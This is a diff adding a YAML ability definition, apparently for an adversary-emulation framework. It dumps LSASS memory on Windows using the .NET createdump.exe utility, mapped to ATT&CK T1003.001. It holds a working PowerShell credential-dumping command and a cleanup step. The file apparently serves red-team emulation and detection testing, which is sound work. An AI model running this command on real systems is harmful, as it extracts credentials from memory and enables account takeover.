@@ -1,0 +1,23 @@
+---
+- id: 8e01631039faf6a9a84df376bf9ad0f1
+  name: Dump LSASS with createdump.exe from .Net v5
+  description: 'Use createdump executable from .NET to create an LSASS dump.
+
+
+    [Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      psh:
+        command: $exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe";
+          & "$exePath" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
+        payloads: []
+        cleanup: Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
